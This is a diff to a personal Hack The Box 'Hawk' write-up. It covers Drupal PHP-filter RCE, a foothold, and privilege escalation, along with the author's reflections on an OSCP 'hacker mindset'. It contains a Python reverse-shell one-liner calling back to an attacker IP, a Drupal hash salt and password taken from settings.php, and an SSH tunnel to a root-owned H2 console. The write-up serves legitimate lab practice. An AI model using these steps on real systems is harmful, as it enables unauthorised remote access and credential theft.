@@ -162,10 +162,85 @@ payload_enc
 [Python3 Exploit](https://github.com/oways/SA-CORE-2018-004) 
 -  Returns .html, but my guess is that - testing with tcpdump is that the sites directory make the off-the-shelf-exploit not produce a RCE.
 
-An 1.5 hour of figgling around; Lesson dithering on the exploits.
+An 1.5 hour of figgling around; Lesson dithering on the exploits. 
+
+- Lesson head battering ramming a OSCP mindset that is there is an exploit for this it must work once you configure it. Unfortunately configuring the exploit is a rabbithole. Both:
+
+[rana-khalil](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/more-challenging-than-oscp/hawk-writeup-w-o-metasploit#cd9a)
+[[Raj Chandel](https://www.hackingarticles.in/author/admin/)](https://www.hackingarticles.in/hack-the-box-hawk-walkthrough/)
+
+It is configure the drupal. - Takeaway continue with making vm hosting drupal. [This seems insane](https://www.drupal.org/docs/7/core/modules/php), but apparently you can just press the RCE me button it is drupal core module - was removed in [drupal 8](https://www.drupal.org/docs/core-modules-and-themes).  ![](evalphp.png)
+
+Unfortunately not saving the configuration makes me not a security risk. A part of me must really want stop myself making poor security choices. 
+
+![](testingrceOne.png)
+and the result; weird that daniel and data users are not present.
+![](testingrceTwo.png)
 
 ## Foothold
 
+Using port 21 to be more OSCP ready.
+![](shwithwwwdata.png)
+
+What the hell is agentx?
+ ![](agentxdirectory.png)
+
 ## PrivEsc
 
-      
+/var/www/html/sites/default/settings.php
+$drupal_hash_salt = 'LrDo0zR-UKwhAUPsDYm5qD-RaI-Llu5kJM8XLF8ZYpg
+drupal4hawk
+![](daniel.png)
+
+We are in a python3.6 environment, which we can just escape with python reverse shell.
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.109",8083));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+```
+
+[Agentx protocol](https://docs.oracle.com/cd/E19253-01/817-3155/auto33/index.html) - The AgentX protocol enables subagents to connect to the master agent. The protocol also enables the master agent to distribute received SNMP protocol messages to the subagents.
+
+The AgentX protocol defines an SNMP agent to consist of one master agent entity and other subagent entities. The master agent runs on the SNMP port, and sends and receives SNMP messages as specified by the SNMP framework documents. The master agent does not access the subagents' management information directly. The subagents do not handle SNMP messages, but subagents do access their management information. In short, the master agent handles SNMP for the subagents, and **only** handles SNMP. The subagent handles manipulation of management data but does not handle SNMP messages. The responsibilities of each type of agent are strictly defined. The master agent and subagents communicate through AgentX protocol messages. AgentX is described in detail by RFC 2741. See [http://www.ietf.org/rfc/rfc2741.txt](http://www.ietf.org/rfc/rfc2741.txt)
+
+Ran linpeas.sh - CVE-2021-4034, but no cc, make or gcc.
+
+![](rootprocesses.png)
+ldap on linux?
+![](ldaponlinux.png)
+
+![](dnseh.png)
+internal dns and mysql
+![](deniedmysql.png)
+
+![](weirddns.png)
+
+![](optdir.png)
+[/opt/lshell](https://github.com/ghantoos/lshell) is just the restricted shell.
+
+![](rootdoingphpstuff.png)
+
+sessionclean - a script to cleanup stale PHP sessions
+![](sessioncleancode.png)
+
+[stackoverflow](https://serverfault.com/questions/511609/why-does-debian-clean-php-sessions-with-a-cron-job-instead-of-using-phps-built) *"Because Debian sets very stringent permissions on `/var/lib/php5` (1733, owner root, group root) to prevent PHP session hijacking. Unfortunately, this also prevents the native PHP session garbage collector from working, because it can't see the session files there. The cron job runs as root, which does have sufficient access to see and clean up the session files."*
+
+Default functionality.
+
+
+Failed after and hour, but PrivEsc without help, peaked at writeup, failing was due to again not be throughtout and check current processes. I havve either lots of failures or successes with services and pspy is awesome, but maybe that means I forget the static `ps -aux`. h2 in /opt is root owned, so youcant do anything with it also. So I had pieces either biases and that pspy showing running processes per minute so I was dazzled by the phpsession spawning. 
+![1000](failedbutnotlost.png)
+
+[H2](http://www.h2database.com/html/main.html)
+
+![](noremotewebaccess.png)
+
+I don't think I would have tried tunnelling with ssh, but that is the method
+```bash
+ssh daniel@10.10.10.10 -L 8082:localhost:8082
+```
+
+![](connections.png)
+
+If I had screenshot the 8082 I would maybe had this in mind. Also I added to my list of how to think about conenctions I need to be broader than just chisel in thinking. Anyway it is root owned so credentials wont work. We can read files with [H2](http://www.h2database.com/javadoc/org/h2/tools/Backup.html), which is also very un OSCP like as the intended path must end with root shell. I was pensive and frustated at myself I just followed allow 
+ with [0xdf](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html#enumeration-1).
+
+For some time it have tried to instill a problem solving mindset that is what is consider a hacking mindset it frustrates me that it has taken much longer to instill  this how can I make x system do something it is  not intended to to do. This problem I have tried to solve with contextualisation, research into intended design, tools, OSes. I think I naively I have more architecture problem solving that lent itself to building and coding - partly why hacking is so important to me as that it an extension to thinking. I know I need to ask more questions, am I more curious, but either my noting is not organised due to time or returning to these boxes. Tonight I am going to do another couple of CTFs and really pause and question system ->  result *"hacker mindset"* and problem solving mindset. And try to write down in some philosphical way in relation to probelm solving that I know I actually got ok at - programming. 
